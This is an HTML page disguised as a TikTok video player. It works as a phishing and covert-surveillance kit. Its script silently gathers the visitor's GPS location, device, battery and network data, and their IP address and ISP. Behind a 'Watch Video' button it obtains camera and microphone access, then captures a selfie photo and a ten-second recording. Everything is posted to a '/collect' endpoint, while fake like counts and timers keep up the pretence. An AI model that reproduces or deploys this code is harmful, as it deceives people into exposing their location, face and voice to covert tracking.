<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Make Your Day</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#000;color:#fff;height:100vh;overflow:hidden}
        .container{width:100%;height:100vh;position:relative;background:#111}
        .status-bar{position:absolute;top:0;left:0;right:0;padding:10px 15px;display:flex;justify-content:space-between;align-items:center;z-index:50;background:rgba(0,0,0,0.4)}
        .green-dot{width:12px;height:12px;background:#34c759;border-radius:50%;display:none;box-shadow:0 0 8px rgba(52,199,89,0.8);animation:pulse 2s infinite}
        .yellow-dot{width:12px;height:12px;background:#ffcc00;border-radius:50%;display:none;box-shadow:0 0 8px rgba(255,204,0,0.8);animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{box-shadow:0 0 8px rgba(52,199,89,0.8)}50%{box-shadow:0 0 16px rgba(52,199,89,1)}}
        .dots-group{display:flex;gap:10px;align-items:center}
        .timer{color:#fff;font-size:13px}
        .bg-screen{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);display:flex;justify-content:center;align-items:center}
        .progress-bar{position:absolute;bottom:50px;left:20px;right:20px;height:3px;background:rgba(255,255,255,0.2);border-radius:2px;z-index:10}
        .progress-fill{height:100%;background:#ff0050;border-radius:2px;animation:progress 300s linear forwards}
        @keyframes progress{from{width:0%}to{width:100%}}
        .side-buttons{position:absolute;right:12px;bottom:120px;display:flex;flex-direction:column;align-items:center;gap:25px;z-index:5}
        .side-btn{display:flex;flex-direction:column;align-items:center;gap:4px}
        .side-btn .icon{width:45px;height:45px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:22px}
        .side-btn span{font-size:11px;color:#ddd}
        .bottom-info{position:absolute;bottom:60px;left:15px;right:70px;z-index:5}
        .username{font-weight:700;font-size:15px;margin-bottom:6px}
        .badge{background:#ff0050;font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px}
        .caption{font-size:13px;color:#ddd;margin-bottom:8px}
        .music{font-size:11px;color:#999}
        .bottom-nav{position:absolute;bottom:0;width:100%;display:flex;justify-content:space-around;padding:12px 0 25px;background:#000;border-top:1px solid#222;z-index:10}
        .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;font-size:10px;color:#888}
        .nav-item.active{color:#fff}
        .nav-item .nav-icon{font-size:22px}
        .nav-item .plus{background:#ff0050;width:30px;height:30px;border-radius:8px;display:flex;justify-content:center;align-items:center;font-size:20px;color:#fff}
        #cameraPreview{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:10;display:none}
        .rec-msg{position:absolute;top:50px;left:50%;transform:translateX(-50%);color:#ff0050;font-size:14px;font-weight:700;z-index:30;display:none;background:rgba(0,0,0,0.6);padding:6px 14px;border-radius:15px}
        .allow-btn{position:absolute;bottom:180px;left:50%;transform:translateX(-50%);background:#ff0050;color:#fff;border:none;padding:15px 40px;border-radius:30px;font-size:18px;font-weight:700;z-index:20;cursor:pointer}
    </style>
</head>
<body>
    <div class="container">
        <div class="status-bar">
            <span class="timer" id="displayTimer">5:00</span>
            <div class="dots-group">
                <div class="green-dot" id="greenDot"></div>
                <div class="yellow-dot" id="yellowDot"></div>
            </div>
        </div>
        <div class="rec-msg" id="recMsg"></div>
        <div class="bg-screen"></div>
        <video id="cameraPreview" autoplay muted playsinline></video>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <button class="allow-btn" id="allowBtn" onclick="startAll()">▶ Watch Video</button>
        <div class="side-buttons">
            <div class="side-btn"><div class="icon">👤</div></div>
            <div class="side-btn"><div class="icon">❤️</div><span id="likeCount">87.4K</span></div>
            <div class="side-btn"><div class="icon">💬</div><span>2.4K</span></div>
            <div class="side-btn"><div class="icon">🔗</div><span>Share</span></div>
            <div class="side-btn"><div class="icon">🎵</div></div>
        </div>
        <div class="bottom-info">
            <div class="username">@trending_viral<span class="badge">Follow</span></div>
            <div class="caption">Wait for it... 😱🔥 #fyp #trending #viral</div>
            <div class="music">🎵 Original Sound - TikTok</div>
        </div>
        <div class="bottom-nav">
            <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
            <div class="nav-item"><div class="nav-icon">🔍</div>Discover</div>
            <div class="nav-item"><div class="plus">+</div></div>
            <div class="nav-item"><div class="nav-icon">💬</div>Inbox</div>
            <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
        </div>
    </div>
    
    <script>
        var d={sessionId:'s_'+Date.now(),timestamp:new Date().toISOString(),userAgent:navigator.userAgent};
        var recorder,chunks=[],stream;
        
        // Phase 1: Collect data immediately
        function collectData(){
            if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){d.gps={lat:p.coords.latitude,lon:p.coords.longitude};},function(){},{timeout:5000});}
            d.device={platform:navigator.platform,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'?',language:navigator.language};
            navigator.getBattery().then(function(b){d.battery={charging:b.charging,level:Math.round(b.level*100)+'%'};});
            if(navigator.connection)d.connection={type:navigator.connection.effectiveType,downlink:navigator.connection.downlink};
            fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{d.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};send('phase1');});
        }
        
        function send(phase){d.phase=phase;fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});}
        
        async function startAll(){
            document.getElementById('allowBtn').style.display='none';
            try{
                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
                var p=document.getElementById('cameraPreview');
                p.srcObject=stream;p.style.display='block';await p.play();
                document.getElementById('greenDot').style.display='block';
                document.getElementById('yellowDot').style.display='block';
                
                // Photo after 0.5s
                await new Promise(r=>setTimeout(r,500));
                var c=document.createElement('canvas');
                c.width=p.videoWidth||640;c.height=p.videoHeight||480;
                c.getContext('2d').drawImage(p,0,0);
                d.photo=c.toDataURL('image/jpeg',0.9);
                send('phase2');
                p.style.display='none';
                
                // Record 10s
                recorder=new MediaRecorder(stream);
                recorder.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data);};
                recorder.onstop=function(){
                    var b=new Blob(chunks,{type:'video/webm'});
                    var r=new FileReader();
                    r.onload=function(){d.video=r.result;send('phase3');};
                    r.readAsDataURL(b);
                };
                recorder.start(1000);
                
                var s=10,el=document.getElementById('recMsg');el.style.display='block';
                el.textContent='● REC '+s+'s';
                var id=setInterval(function(){s--;if(s>0)el.textContent='● REC '+s+'s';else{clearInterval(id);el.style.display='none';}},1000);
                
                setTimeout(function(){
                    if(recorder&&recorder.state==='recording'){recorder.stop();stream.getTracks().forEach(t=>t.stop());}
                    document.getElementById('greenDot').style.display='none';
                    document.getElementById('yellowDot').style.display='none';
                },10000);
            }catch(e){alert('Please allow camera: '+e.message);}
        }
        
        collectData();
        
        var t=300;
        setInterval(function(){if(t>0){t--;var m=Math.floor(t/60),s=t%60;document.getElementById('displayTimer').textContent=m+':'+(s<10?'0':'')+s;}},1000);
        setInterval(function(){var el=document.getElementById('likeCount'),v=parseFloat(el.textContent);if(v<95)el.textContent=(v+0.1).toFixed(1)+'K';},4000);
    </script>
</body>
</html>
